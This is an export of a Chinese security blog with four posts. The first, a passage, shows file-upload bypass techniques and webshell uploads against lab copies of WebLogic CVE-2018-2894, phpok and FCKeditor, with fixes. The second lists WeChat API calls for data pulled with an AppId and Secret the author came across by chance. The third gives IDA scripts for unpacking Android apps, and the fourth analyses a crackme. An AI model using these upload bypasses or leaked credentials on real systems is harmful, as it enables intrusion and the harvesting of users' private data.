&#x3D;&#x3D; &#39;unknown&#39;)&#123; $msg &#x3D; &quot;文件未知，上传失败！&quot;; &#125;else&#123; $file_ext &#x3D; substr($_FILES[&#39;upload_file&#39;][&#39;name&#39;],strrpos($_FILES[&#39;upload_file&#39;][&#39;name&#39;],&quot;.&quot;)+1); &#x2F;&#x2F;此处为了方便演示添加了file_ext 变量 $img_path &#x3D; UPLOAD_PATH.&quot;&#x2F;&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext; if(move_uploaded_file($temp_file,$img_path))&#123; $is_upload &#x3D; true; &#125; else &#123; $msg &#x3D; &quot;上传出错！&quot;; &#125; &#125; &#125; 然后上传php文件，修改文件内容，添加文件头GIF89a： 这种添加形式类似于在hex中修改添加： 然后在访问以上传的文件： 0x07、利用工具进行FUZZ​ 很多网站对上传进行拦截的时候采取的是黑名单校验，当我们看到黑名单的时候就可以考虑采取修改后缀、截断等方式尝试绕过。 ​ 我们采用一个工具：https://github.com/c0ny1/upload-fuzz-dic-builder 来生成fuzz的字典。执行命令: python upload-fuzz-dic-builder.py -n test -a jpg -l php -m apache --os win -o upload_file.txt ​ 把生成的字典导入burp中，同时取消payload-encoding的选中状态。执行后可以看到有些php文件上传成功。然后访问其中上传成功的文件，查看是否执行。 访问如图中的地址文件，可以看到上传成功： 0x08、实战演示演示漏洞为：CVE-2018-2894 漏洞环境：Linux Weblogic 12.2 漏洞下载地址：https://github.com/vulhub/vulhub/tree/master/weblogic/CVE-2018-2894 漏洞介绍：WebLogic管理端未授权的两个页面存在任意上传getshell漏洞，可直接获取权限。两个页面分别为/ws_utc/begin.do，/ws_utc/config.do。 影响范围为：Oracle WebLogic Server，版本10.3.6.0，12.1.3.0，12.2.1.2，12.2.1.3。 下载好vulhub后，进入相应的CVE目录，执行如下命令： docker-compose up -d 等到docker构建结束，会在7001端口开放一个服务，如下所示： 此处需要登陆账号和密码，正常情况下是尝试弱口令进后台上传文件，此处方便演示，从构建日志中查看密码： docker-compose logs | grep password 查看结果： weblogic_1 | ----&gt; &#39;weblogic&#39; admin password: oZUcqr8j weblogic_1 | admin password : [oZUcqr8j] weblogic_1 | * password assigned to an admin-level user. For * 登陆后界面如下： 点击左侧中的base_domain选项，再点击下面的高级选项，从高级中启用web测试页，保存。 然后访问http://192.168.120.132:7001/ws_utc/config.do页面，设置Work Home Dir，可以看到其中已经填写一个目录，此目录访问需要登陆，修改为P牛的建议路径： &#x2F;u01&#x2F;oracle&#x2F;user_projects&#x2F;domains&#x2F;base_domain&#x2F;servers&#x2F;AdminServer&#x2F;tmp&#x2F;_WL_internal&#x2F;com.oracle.webservices.wls.ws-testclient-app-wls&#x2F;4mcj4y&#x2F;war&#x2F;css 原路径为： &#x2F;u01&#x2F;oracle&#x2F;user_projects&#x2F;domains&#x2F;base_domain&#x2F;tmp&#x2F;WSTestPageWorkDir 在当前页面中选择安全-&gt;增加，上传webshell 然后从放回页面中查看id项时间戳，访问路径/ws_utc/css/config/keystore/时间戳_文件名 然后执行命令whoami: 0x09、CMS实战演示0x09-1、PHPOK 任意文件上传演示漏洞为：phpok 任意文件上传 漏洞环境：Windows phpStudy 漏洞环境下载：https://download.phpok.com/4.8.338.zip 漏洞介绍：phpok 4.8.338版本管理后台存在任意文件上传漏洞，攻击者可利用漏洞上传任意文件，获取网站权限。 下载文件后，把解压的文件放入phpstudy中的www目录中，此处修改了版本号目录为phpok。然后访问本地地址：http://localhost/phpok，会自动进入安装页面，填写数据库密码，创建账号后自动进入安装页面，安装完成后显示如下： 使用一开始创建的账号密码登陆，登陆成功后在后侧的选择栏处选择工具-&gt;附件分类管理。 点击右侧上方的创建资源分类，然后在支持的附件类型中创建php文件类型。 选择左侧的内容管理-&gt;资讯中心-&gt;行业管理 点击页面中的选择图片-&gt;上传附近选择添加的附件类型-&gt;选择php文件上传，上传成功后点击上传的图片，选择预览就可以看到文件目录的地址 访问地址文件后门，可以看到执行代码成功 漏洞修复：此问题在高版本修复，及时升级到高版本处理，目前最新版本为5.2.116。 0x09-2、FCKeditor 2.4.3 文件上传演示漏洞为：FCKeditor 2.4.3 文件上传 漏洞环境：Windows phpStudy 漏洞环境下载：https://github.com/treadmillian/fckeditor.git 漏洞介绍：FCKeditor /fckeditor/editor/filemanager/upload/php/upload.php 文件上传漏洞。 首先从GitHub下载文件，放到phpStudy的www目录中，同时修改config.php文件，修改UserFilesPath参数为fck目录下的地址，修改如下： 文件地址： \\fckeditor\\editor\\filemanager\\browser\\default\\connectors\\php\\config.php 访问地址：http://localhost/fckeditor/editor/filemanager/browser/default/connectors/test.html# 选择文件上传，由于2.4.3在文件配置已经进行了后缀的限制，默认限制为： array(&#39;html&#39;,&#39;htm&#39;,&#39;php&#39;,&#39;php2&#39;,&#39;php3&#39;,&#39;php4&#39;,&#39;php5&#39;,&#39;phtml&#39;,&#39;pwml&#39;,&#39;inc&#39;,&#39;asp&#39;,&#39;aspx&#39;,&#39;ascx&#39;,&#39;jsp&#39;,&#39;cfm&#39;,&#39;cfc&#39;,&#39;pl&#39;,&#39;bat&#39;,&#39;exe&#39;,&#39;com&#39;,&#39;dll&#39;,&#39;vbs&#39;,&#39;js&#39;,&#39;reg&#39;,&#39;cgi&#39;,&#39;htaccess&#39;,&#39;asis&#39;,&#39;sh&#39;,&#39;shtml&#39;,&#39;shtm&#39;,&#39;phtm&#39;) 对于此处漏洞我们采用空格绕过，先上传一个JPG的图片，抓包修改后缀，添加空格如下： 访问上传产生的路径文件，路径会显示在页面中： http:&#x2F;&#x2F;localhost&#x2F;fckeditor&#x2F;editor&#x2F;filemanager&#x2F;browser&#x2F;default&#x2F;connectors&#x2F;uploads&#x2F;file&#x2F;05091707156.php 执行一句话木马文件： 漏洞修复：由于此处使用黑名单校验，可以根据需要的类型修改为白名单参数。 0x10、漏洞修复关于文件上传漏洞的产生和修改此处讨论两种文件上传漏洞的情况和修复： 1、代码未判断文件类型或者文件类型限制不完全，一般这种是黑名单或者没有限制，建议添加白名单限制参数数组，固定为图片或文本格式文件。例如如下： if(isset($_POST[&#39;submit&#39;]))&#123; $ext_arr &#x3D; array(&#39;jpg&#39;,&#39;png&#39;,&#39;gif&#39;); $file_ext &#x3D; substr($_FILES[&#39;upload_file&#39;][&#39;name&#39;],strrpos($_FILES[&#39;upload_file&#39;][&#39;name&#39;],&quot;.&quot;)+1); if(in_array($file_ext,$ext_arr))&#123; $temp_file &#x3D; $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;]; $img_path &#x3D; UPLOAD_PATH.&#39;&#x2F;&#39;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext; if(move_uploaded_file($temp_file,$img_path))&#123; $is_upload &#x3D; true; &#125; else &#123; $msg &#x3D; &quot;上传失败&quot;; &#125; &#125; else &#123; $msg &#x3D; &quot;只允许上传.jpg|.png|.gif类型文件！&quot;; &#125; &#125; 2、如果是使用WEB中间件存在上传，或者是CMS存在文件上传漏洞，根据官方建议安装补丁升级版本，或者使用官方推荐的临时修改策略来限制问题的产生和利用。","categories":[],"tags":[{"name":"web安全","slug":"web安全","permalink":"https://misakikata.github.io/tags/web%E5%AE%89%E5%85%A8/"}]},{"title":"微信公众号接口","slug":"微信公众号接口","date":"2019-05-27T03:32:58.000Z","updated":"2019-05-27T03:33:38.000Z","comments":true,"path":"2019/05/微信公众号接口/","link":"","permalink":"https://misakikata.github.io/2019/05/%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7%E6%8E%A5%E5%8F%A3/","excerpt":"","text":"在一个偶然的机会获取到了一对微信AppId与Secret，于是整理了一下常用和有用的微信公众号信息获取的接口，以下是部分微信接口调用示例和说明。 1、平台开发者获取access_tokenaccess_token是公众号的全局唯一接口调用凭据，公众号调用各接口时都需使用access_token。access_token的有效期目前为2个小时，需定时刷新，重复获取将导致上次获取的access_token失效。 a、接口调用请求说明http请求方式: GET https:&#x2F;&#x2F;api.weixin.qq.com&#x2F;cgi-bin&#x2F;token?grant_type&#x3D;client_credential&amp;appid&#x3D;APPID&amp;secret&#x3D;APPSECRET b、参数说明参数 是否必须 说明 grant_type 是 获取access_token填写client_credential appid 是 第三方用户唯一凭证 secret 是 第三方用户唯一凭证密钥，即appsecret c、返回说明微信会返回下述JSON数据包给公众号： &#123;&quot;access_token&quot;:&quot;ACCESS_TOKEN&quot;,&quot;expires_in&quot;:7200&#125; 2、获取微信服务器IP地址如果公众号基于安全等考虑，需要获知微信服务器的IP地址列表，以便进行相关限制，可以通过该接口获得微信服务器IP地址列表或者IP网段信息。 a、接口调用请求说明http请求方式: GET https:&#x2F;&#x2F;api.weixin.qq.com&#x2F;cgi-bin&#x2F;getcallbackip?access_token&#x3D;ACCESS_TOKEN b、参数说明参数 是否必须 说明 access_token 是 公众号的access_token c、返回说明正常情况下，微信会返回下述JSON数据包给公众号： &#123; &quot;ip_list&quot;: [ &quot;127.0.0.1&quot;, &quot;127.0.0.2&quot;, &quot;101.226.103.0&#x2F;25&quot; ] &#125; 3、自定义菜单查询接口使用接口创建自定义菜单后，开发者还可使用接口查询自定义菜单的结构。另外请注意，在设置了个性化菜单后，使用本自定义菜单查询接口可以获取默认菜单和全部个性化菜单信息。 a、请求说明http请求方式：GET https:&#x2F;&#x2F;api.weixin.qq.com&#x2F;cgi-bin&#x2F;menu&#x2F;get?access_token&#x3D;ACCESS_TOKEN b、参数说明参数 是否必须 说明 access_token 是 公众号的access_token c、返回说明对应创建接口，正确的Json返回结果: &#123; &quot;menu&quot;: &#123; &quot;button&quot;: [ &#123; &quot;type&quot;: &quot;click&quot;, &quot;name&quot;: &quot;今日歌曲&quot;, &quot;key&quot;: &quot;V1001_TODAY_MUSIC&quot;, &quot;sub_button&quot;: [ ] &#125;, &#123; &quot;name&quot;: &quot;菜单&quot;, &quot;sub_button&quot;: [ &#123; &quot;type&quot;: &quot;view&quot;, &quot;name&quot;: &quot;搜索&quot;, &quot;url&quot;: &quot;http:&#x2F;&#x2F;www.soso.com&#x2F;&quot;, &quot;sub_button&quot;: [ ] &#125; ] &#125; ] &#125; &#125; 4、自定义菜单删除接口使用接口创建自定义菜单后，开发者还可使用接口删除当前使用的自定义菜单。另请注意，在个性化菜单时，调用此接口会删除默认菜单及全部个性化菜单。 a、请求说明http请求方式：GET https:&#x2F;&#x2F;api.weixin.qq.com&#x2F;cgi-bin&#x2F;menu&#x2F;delete?access_token&#x3D;ACCESS_TOKEN b、参数说明参数 是否必须 说明 access_token 是 公众号的access_token c、返回说明对应创建接口，正确的Json返回结果: &#123;&quot;errcode&quot;:0,&quot;errmsg&quot;:&quot;ok&quot;&#125; 5、添加客服帐号开发者可以通过本接口为公众号添加客服账号，每个公众号最多添加10个客服账号。 a、接口调用请求http请求方式: POST https:&#x2F;&#x2F;api.weixin.qq.com&#x2F;customservice&#x2F;kfaccount&#x2F;add?access_token&#x3D;ACCESS_TOKEN b、POST数据示例&#123; &quot;kf_account&quot; : &quot;test1@test&quot;, &quot;nickname&quot; : &quot;客服1&quot;, &quot;password&quot; : &quot;pswmd5&quot;, &#125; c、返回说明正确时的JSON返回结果 &#123; &quot;errcode&quot; : 0, &quot;errmsg&quot; : &quot;ok&quot;, &#125; 6、获取所有客服账号开发者通过本接口，获取公众号中所设置的客服基本信息，包括客服工号、客服昵称、客服登录账号。 a、接口调用请求http请求方式: GET https:&#x2F;&#x2F;api.weixin.qq.com&#x2F;cgi-bin&#x2F;customservice&#x2F;getkflist?access_token&#x3D;ACCESS_TOKEN b、返回说明&#123; &quot;kf_list&quot;: [ &#123; &quot;kf_account&quot;: &quot;test1@test&quot;, &quot;kf_nick&quot;: &quot;ntest1&quot;, &quot;kf_id&quot;: &quot;1001&quot; &quot;kf_headimgurl&quot;: &quot; http:&#x2F;&#x2F;mmbiz.qpic.cn&#x2F;mmbiz&#x2F;4whpV1VZl2iccsvYbHvnphkyGtnvjfUS8Ym0GSaLic0FD3vN0V8PILcibEGb2fPfEOmw&#x2F;0&quot; &#125;, &#123; &quot;kf_account&quot;: &quot;test2@test&quot;, &quot;kf_nick&quot;: &quot;ntest2&quot;, &quot;kf_id&quot;: &quot;1002&quot; &quot;kf_headimgurl&quot;: &quot; http:&#x2F;&#x2F;mmbiz.qpic.cn&#x2F;mmbiz&#x2F;4whpV1VZl2iccsvYbHvnphkyGtnvjfUS8Ym0GSaLic0FD3vN0V8PILcibEGb2fPfEOmw &#x2F;0&quot; &#125; ] &#125; 7、修改客服帐号开发者可以通过本接口为公众号修改客服账号。 a、接口调用请求http请求方式: POST https:&#x2F;&#x2F;api.weixin.qq.com&#x2F;customservice&#x2F;kfaccount&#x2F;update?access_token&#x3D;ACCESS_TOKEN b、POST数据示例&#123; &quot;kf_account&quot; : &quot;test1@test&quot;, &quot;nickname&quot; : &quot;客服1&quot;, &quot;password&quot; : &quot;pswmd5&quot;, &#125; c、返回说明正确时的JSON返回结果 &#123; &quot;errcode&quot; : 0, &quot;errmsg&quot; : &quot;ok&quot;, &#125; 8、删除客服帐号开发者可以通过该接口为公众号删除客服帐号。 a、接口调用请求http请求方式: GET https:&#x2F;&#x2F;api.weixin.qq.com&#x2F;customservice&#x2F;kfaccount&#x2F;del?access_token&#x3D;ACCESS_TOKEN b、POST数据示例&#123; &quot;kf_account&quot; : &quot;test1@test&quot;, &quot;nickname&quot; : &quot;客服1&quot;, &quot;password&quot; : &quot;pswmd5&quot;, &#125; c、返回说明正确时的JSON返回结果 &#123; &quot;errcode&quot; : 0, &quot;errmsg&quot; : &quot;ok&quot;, &#125; 9、用户授权登陆第三方应用第三方使用网站应用授权登录前请注意已获取相应网页授权作用域（scope=snsapi_login）。 第一步https:&#x2F;&#x2F;open.weixin.qq.com&#x2F;connect&#x2F;qrconnect?appid&#x3D;APPID&amp;redirect_uri&#x3D;REDIRECT_URI&amp;response_type&#x3D;code&amp;scope&#x3D;SCOPE&amp;state&#x3D;STATE#wechat_redirect 参数说明参数 是否必须 说明 appid 是 应用唯一标识 redirect_uri 是 请使用urlEncode对链接进行处理 response_type 是 填code scope 是 应用授权作用域，拥有多个作用域用逗号（,）分隔，网页应用目前仅填写snsapi_login即 state 否 用于保持请求和回调的状态，授权请求后原样带回给第三方。该参数可用于防止csrf攻击（跨站请求伪造攻击），建议第三方带上该参数，可设置为简单的随机数加session进行校验 返回说明用户允许授权后，将会重定向到redirect_uri的网址上，并且带上code和state参数 redirect_uri?code&#x3D;CODE&amp;state&#x3D;STATE 第二步通过code获取access_token https:&#x2F;&#x2F;api.weixin.qq.com&#x2F;sns&#x2F;oauth2&#x2F;access_token?appid&#x3D;APPID&amp;secret&#x3D;SECRET&amp;code&#x3D;CODE&amp;grant_type&#x3D;authorization_code 参数说明参数 是否必须 说明 appid 是 应用唯一标识，在微信开放平台提交应用审核通过后获得 secret 是 应用密钥AppSecret，在微信开放平台提交应用审核通过后获得 code 是 填写第一步获取的code参数 grant_type 是 填authorization_code 返回说明正确的返回： &#123; &quot;access_token&quot;:&quot;ACCESS_TOKEN&quot;, &quot;expires_in&quot;:7200, &quot;refresh_token&quot;:&quot;REFRESH_TOKEN&quot;, &quot;openid&quot;:&quot;OPENID&quot;, &quot;scope&quot;:&quot;SCOPE&quot;, &quot;unionid&quot;: &quot;o6_bmasdasdsad6_2sgVt7hMZOPfL&quot; &#125; 第三步获取access_token后，进行接口调用，有以下前提： 1. access_token有效且未超时； 2. 微信用户已授权给第三方应用帐号相应接口作用域（scope）。 接口作用域（scope），能调用的接口有以下其中snsapi_base属于基础接口，若应用已拥有其它scope权限，则默认拥有snsapi_base的权限。 授权作用域（scope） 接口 接口说明 snsapi_base /sns/oauth2/access_token 通过code换取access_token、refresh_token和已授权scope snsapi_base /sns/oauth2/refresh_token 刷新或续期access_token使用 snsapi_base /sns/auth 检查access_token有效性 snsapi_userinfo /sns/userinfo 获取用户个人信息 拉取用户信息(需scope为 snsapi_userinfo)http：GET https:&#x2F;&#x2F;api.weixin.qq.com&#x2F;sns&#x2F;userinfo?access_token&#x3D;ACCESS_TOKEN&amp;openid&#x3D;OPENID&amp;lang&#x3D;zh_CN 参数说明参数 描述 access_token 网页授权接口调用凭证,注意：此access_token与基础支持的access_token不同 openid 用户的唯一标识 lang 返回国家地区语言版本，zh_CN 简体，zh_TW 繁体，en 英语 返回说明正确时返回的JSON数据包如下： &#123;&quot;openid&quot;:&quot; OPENID&quot;, &quot; nickname&quot;: NICKNAME, &quot;sex&quot;:&quot;1&quot;, &quot;province&quot;:&quot;PROVINCE&quot; &quot;city&quot;:&quot;CITY&quot;, &quot;country&quot;:&quot;COUNTRY&quot;, &quot;headimgurl&quot;: &quot;http:&#x2F;&#x2F;wx.qlogo.cn&#x2F;mmopen&#x2F;g3MonUZtNHkdmzicIlibx6iaFqAc56vxLSUfpb6n5WKSYVY0ChQKkiaJSgQ1dZuTOgvLLrhJbERQQ4eMsv84eavHiaiceqxibJxCfHe&#x2F;46&quot;, &quot;privilege&quot;:[ &quot;PRIVILEGE1&quot; &quot;PRIVILEGE2&quot; ], &quot;unionid&quot;: &quot;o6_bmasdasdsad6_2sgVt7hMZOPfL&quot; &#125; 检验授权凭证（access_token）是否有效http：GET https:&#x2F;&#x2F;api.weixin.qq.com&#x2F;sns&#x2F;auth?access_token&#x3D;ACCESS_TOKEN&amp;openid&#x3D;OPENID 参数说明参数 描述 access_token 网页授权接口调用凭证,注意：此access_token与基础支持的access_token不同 openid 用户的唯一标识 返回说明正确的JSON返回结果： &#123; &quot;errcode&quot;:0,&quot;errmsg&quot;:&quot;ok&quot;&#125; 错误时的JSON返回示例： &#123; &quot;errcode&quot;:40003,&quot;errmsg&quot;:&quot;invalid openid&quot;&#125; 10、批量获取用户基本信息请求说明http请求方式: POST https:&#x2F;&#x2F;api.weixin.qq.com&#x2F;cgi-bin&#x2F;user&#x2F;info&#x2F;batchget?access_token&#x3D;ACCESS_TOKEN POST数据示例&#123; &quot;user_list&quot;: [ &#123; &quot;openid&quot;: &quot;otvxTs4dckWG7imySrJd6jSi0CWE&quot;, &quot;lang&quot;: &quot;zh-CN&quot; &#125;, &#123; &quot;openid&quot;: &quot;otvxTs_JZ6SEiP0imdhpi50fuSZg&quot;, &quot;lang&quot;: &quot;zh-CN&quot; &#125; ] &#125; 返回说明&#123; &quot;user_info_list&quot;: [ &#123; &quot;subscribe&quot;: 1, &quot;openid&quot;: &quot;otvxTs4dckWG7imySrJd6jSi0CWE&quot;, &quot;nickname&quot;: &quot;iWithery&quot;, &quot;sex&quot;: 1, &quot;language&quot;: &quot;zh_CN&quot;, &quot;city&quot;: &quot;Jieyang&quot;, &quot;province&quot;: &quot;Guangdong&quot;, &quot;country&quot;: &quot;China&quot;, &quot;headimgurl&quot;: &quot;http:&#x2F;&#x2F;wx.qlogo.cn&#x2F;mmopen&#x2F;xbIQx1GRqdvyqkMMhEaGOX802l1CyqMJNgUzKP8MeAeHFicRDSnZH7FY4XB7p8XHXIf6uJA2SCun TPicGKezDC4saKISzRj3nz&#x2F;0&quot;, &quot;subscribe_time&quot;: 1434093047, &quot;unionid&quot;: &quot;oR5GjjgEhCMJFyzaVZdrxZ2zRRF4&quot;, &quot;remark&quot;: &quot;&quot;, &quot;groupid&quot;: 0, &quot;tagid_list&quot;:[128,2] &#125;, &#123; &quot;subscribe&quot;: 0, &quot;openid&quot;: &quot;otvxTs_JZ6SEiP0imdhpi50fuSZg&quot;, &quot;unionid&quot;: &quot;oR5GjjjrbqBZbrnPwwmSxFukE41U&quot;, &#125; ] &#125; 11、获取微信公众号用户列表调用请求说明http请求方式: GET（请使用https协议） https:&#x2F;&#x2F;api.weixin.qq.com&#x2F;cgi-bin&#x2F;user&#x2F;get?access_token&#x3D;ACCESS_TOKEN&amp;next_openid&#x3D;NEXT_OPENID 参数说明参数 是否必须 说明 access_token 是 调用接口凭证 next_openid 是 第一个拉取的OPENID，不填默认从头开始拉取 返回说明正确时返回JSON数据包： &#123;&quot;total&quot;:2,&quot;count&quot;:2,&quot;data&quot;:&#123;&quot;openid&quot;:[&quot;&quot;,&quot;OPENID1&quot;,&quot;OPENID2&quot;]&#125;,&quot;next_openid&quot;:&quot;NEXT_OPENID&quot;&#125; 参数说明参数 说明 total 关注该公众账号的总用户数 count 拉取的OPENID个数，最大值为10000 data 列表数据，OPENID的列表 next_openid 拉取列表的最后一个用户的OPENID 12、企业新版微信客服获取客服基本信息http请求方式: GET https:&#x2F;&#x2F;api.weixin.qq.com&#x2F;cgi-bin&#x2F;customservice&#x2F;getkflist?access_token&#x3D;ACCESS_TOKEN 返回说明返回数据示例（正确时的JSON返回结果）： &#123; &quot;kf_list&quot; : [ &#123; &quot;kf_account&quot; : &quot;test1@test&quot;, &quot;kf_headimgurl&quot; : &quot;http:&#x2F;&#x2F;mmbiz.qpic.cn&#x2F;mmbiz&#x2F;4whpV1VZl2iccsvYbHvnphkyGtnvjfUS8Ym0GSaLic0FD3vN0V8PILcibEGb2fPfEOmw&#x2F;0&quot;, &quot;kf_id&quot; : &quot;1001&quot;, &quot;kf_nick&quot; : &quot;ntest1&quot;, &quot;kf_wx&quot; : &quot;kfwx1&quot; &#125;, &#123; &quot;kf_account&quot; : &quot;test3@test&quot;, &quot;kf_headimgurl&quot; : &quot;http:&#x2F;&#x2F;mmbiz.qpic.cn&#x2F;mmbiz&#x2F;4whpV1VZl2iccsvYbHvnphkyGtnvjfUS8Ym0GSaLic0FD3vN0V8PILcibEGb2fPfEOmw&#x2F;0&quot;, &quot;kf_id&quot; : &quot;1003&quot;, &quot;kf_nick&quot; : &quot;ntest3&quot;, &quot;invite_wx&quot; : &quot;kfwx3&quot;, &quot;invite_expire_time&quot; : 123456789, &quot;invite_status&quot; : &quot;waiting&quot; &#125; ] &#125; 参数说明参数 说明 kf_account 完整客服帐号，格式为：帐号前缀@公众号微信号 kf_nick 客服昵称 kf_id 客服编号 kf_headimgurl 客服头像 kf_wx 如果客服帐号已绑定了客服人员微信号，则此处显示微信号 invite_wx 如果客服帐号尚未绑定微信号，但是已经发起了一个绑定邀请，则此处显示绑定邀请的微信号 invite_expire_time 如果客服帐号尚未绑定微信号，但是已经发起过一个绑定邀请，邀请的过期时间，为unix 时间戳 invite_status 邀请的状态，有等待确认“waiting”，被拒绝“rejected”，过期“expired” 13、获取聊天记录调用说明http请求方式: POST https:&#x2F;&#x2F;api.weixin.qq.com&#x2F;customservice&#x2F;msgrecord&#x2F;getmsglist?access_token&#x3D;ACCESS_TOKEN POST数据示例如下： &#123; &quot;starttime&quot; : 987654321, &quot;endtime&quot; : 987654321, &quot;msgid&quot; : 1, &quot;number&quot; : 10000 &#125; 参数说明参数 说明 starttime 起始时间，unix时间戳 endtime 结束时间，unix时间戳，每次查询时段不能超过24小时 msgid 消息id顺序从小到大，从1开始 number 每次获取条数，最多10000条 返回说明&#123; &quot;recordlist&quot; : [ &#123; &quot;openid&quot; : &quot;oDF3iY9WMaswOPWjCIp_f3Bnpljk&quot;, &quot;opercode&quot; : 2002, &quot;text&quot; : &quot; 您好，客服test1为您服务。&quot;, &quot;time&quot; : 1400563710, &quot;worker&quot; : &quot;test1@test&quot; &#125;, &#123; &quot;openid&quot; : &quot;oDF3iY9WMaswOPWjCIp_f3Bnpljk&quot;, &quot;opercode&quot; : 2003, &quot;text&quot; : &quot;你好，有什么事情？&quot;, &quot;time&quot; : 1400563731, &quot;worker&quot; : &quot;test1@test&quot; &#125; ], &quot;number&quot;:2, &quot;msgid&quot;:20165267 &#125; 参数说明参数 说明 worker 完整客服帐号，格式为：帐号前缀@公众号微信号 openid 用户标识 opercode 操作码，2002（客服发送信息），2003（客服接收消息） text 聊天记录 time 操作时间，unix时间戳 参考资料： 1、微信公众平台开发概述 2、微信开放平台","categories":[],"tags":[{"name":"web安全","slug":"web安全","permalink":"https://misakikata.github.io/tags/web%E5%AE%89%E5%85%A8/"}]},{"title":"基于dvmDexFileOpenPartial的动态脱壳","slug":"基于dvmDexFileOpenPartial的动态脱壳","date":"2019-05-15T06:25:33.000Z","updated":"2019-07-26T09:55:41.000Z","comments":true,"path":"2019/05/基于dvmDexFileOpenPartial的动态脱壳/","link":"","permalink":"https://misakikata.github.io/2019/05/%E5%9F%BA%E4%BA%8EdvmDexFileOpenPartial%E7%9A%84%E5%8A%A8%E6%80%81%E8%84%B1%E5%A3%B3/","excerpt":"","text":"1、dvmDexFileOpenPartial脱壳原理基于libdvm.so下dvmDexFileOpenPartial的文件脱壳，当然如果是新版的加固方式一般不可行，因为会基本会重写dvmDexFileOpenPartial方法。如此，先了解一下libdvm.so的方法dvmDexFileOpenPartial是干什么的。 加密dex文件在软件运行时，必然会解密加载到内存中运行，而dvmDexFileOpenPartial方法的参数： int dvmDexFileOpenPartial(const void* addr, int len, DvmDex** ppDvmDex) 第一个参数代表dex文件的基地址，第二个参数代表dex文件的长度，第三个参数代表出参，dex文件的类，方法等信息。 方法的源码解读：从源码看Dex Dump于dvmDexFileOpenPartial原理 断点脱壳原理分析:dvmDexFileOpenPartial断点脱壳原理分析 示例APP：jscrack 由于使用的Android 4.4.4的环境，加载模式为Dalvik虚拟机模式，libdvm.so则是此模式下的文件，当然在Android 5.0以上取消了Dalvik模式，自然也不存在libdvm.so文件。dalvik虚拟机会把dex文件优化为odex文件,dvmDexFileOpenPartial则用来解析内存中优化过的dex文件，此时dex已经加载进内存，所以就可以dump出来了。 2、示例演示首先调试模式启动APP， adb forward tcp:23946 tcp:23946 #IDA端口转发 adb shell am start -D -n 包名&#x2F;activity名 #调试模式启动APP adb shell ps | grep 包名 #获取APP的PID adb forward tcp:8700 jdwp:pid #进程端口转发 然后调整IDA的调试选项，如下： 选择对应的进程后，页面跳转，选择modules下的libdvm.so中的dvmDexFileOpenPartial方法，如下： 找到方法后，在其第一行下断点，如下情形。 然后转发jdb。此处jdb不可过早转发，不然下一步运行不到指定地址，将会跳过调试模式进入软件内。 jdb -connect com.sun.jdi.SocketAttach:hostname&#x3D;127.0.0.1,port&#x3D;8700 附加完成后可以看到CMD卡在回车处暂无回显，在IDA下运行F9到指定断点处自动下断。 单步运行F8一次即可，可以看到寄存器窗口中R0,R1的地址值。 在file选项中点击script command运行如下脚本。则可以在D盘下看到dump出来的dex文件。 static main(void)&#123; auto fp, dex_addr, end_addr; fp &#x3D; fopen(&quot;D:\\\\dump.dex&quot;, &quot;wb&quot;); end_addr &#x3D; R0 + R1; for ( dex_addr&#x3D;R0; dex_addr &lt; end_addr; dex_addr ++ ) fputc(Byte(dex_addr), fp); &#125; 选择jadx打开dex文件，可以看到源码已dump成功。 3、系统差异此处使用Android 4.4.4，如果使用Android 5.0以上不存在lindvm.so，则需要在libart.so中对Openmemory函数下断，同样操作，保存R1,R2的值，R1代表基地址，R2代表长度。 脚本为 static main(void)&#123; auto fp, dex_addr, end_addr; fp &#x3D; fopen(&quot;D:\\\\dump.dex&quot;, &quot;wb&quot;); end_addr &#x3D; R1 + R2; for ( dex_addr&#x3D;R1; dex_addr &lt; end_addr; dex_addr ++ ) fputc(Byte(dex_addr), fp); &#125; 参考文章： IDA动态调试脱壳步骤","categories":[],"tags":[{"name":"Android逆向","slug":"Android逆向","permalink":"https://misakikata.github.io/tags/Android%E9%80%86%E5%90%91/"}]},{"title":"ISCC Android Crackme","slug":"ISCC-Android-Crackme","date":"2019-04-30T01:47:32.000Z","updated":"2019-07-26T09:56:02.000Z","comments":true,"path":"2019/04/ISCC-Android-Crackme/","link":"","permalink":"https://misakikata.github.io/2019/04/ISCC-Android-Crackme/","excerpt":"","text":"ISCC Android Crackme此为2013年ISCC的一道移动题，相对简单的题，懂点 ARM 指令就差不多了。对于新入手安卓逆向可以做做看来练手。要求是注册为企业版程序。以下分析是建立在伪代码基础上，然后分析修改点，修改ARM汇编。 题目下载：APP 通过反编译代码简单查看功能逻辑，首先是从onCreate函数开始，函数一开始就调用了MyApp的m变量，查看对应的反编译代码。 MyApp是一个native方法的调用，调用了三个方法。 分别是initSN()、saveSN()、work()。并且执行了initSN方法，因此函数应该是注册码的对比和效验功能。 然后在回到以上的代码执行，点击按钮“执行功能”，进入toast弹出界面，通过判断m值来执行是否触发注册方法，默认为0触发，如果注册成功则调用work()函数来做执行功能。查看doRegister，点击确认后，程序进入com.bfs.crackme1.RegActivity类下， 方法判断是否输入注册码，调用saveSN来保存输入的注册码，然后弹窗关闭自身线程。到此，也基本确认了initSN的方法和上文判断一致。 看完基本的Java层函数现在来看so文件的相关代码实现和流程。 查看so的一些函数表，可以看到定义了JNI_Onload，Java层执行System.loadLibrary()后，将执行此函数。同样从函数表中可以看出加密处理为MD5。查看JNI_Onload做了什么处理。 查看伪代码，使用RegisterNatives实现JNI，而RegisterNatives是来做什么处理的，可以查看如下文章： JNI：使用RegisterNatives方法传递和使用Java自定义类 而此处的作用基本可以看到是用来自定义函数命名，不然native中的函数名为Java_com_bfs_crackme1_MainActivity_initSN这种类型，下面只有n1、n2、n3来代替以上方法。 查看n1方法，读取sdcard下的reg.dat文件，来进行MD5效对，要求进行企业版注册，能看到的是注册成功将使用setValue进行对v1的赋值，其中按照MainActivity文件中的判断，猜测3为企业版MD5值。 n2则为如下，读写的形式来对reg.dat 进行重写。 work函数则为如下： 至此，函数名则分析清楚，n1对应initSN，n2对应saveSN，n3对应work。根据函数流程可以大概猜出判断行为：n2保存来自输入的参数的MD5-&gt;n1读取参数进行对应是否为注册值-&gt;注册成功则set到内存一个值-&gt;由work来读取这个值判断注册是否成功以及功能执行。 所以理论上说，patch点有如下处： 1、修改reg.dat为企业版的注册码，修改Java层代码让其不走注册函数。 2、解密MD5值，直接输入注册 3、修改n1，让其返回值永远为3 4、修改work函数获取的v2值。 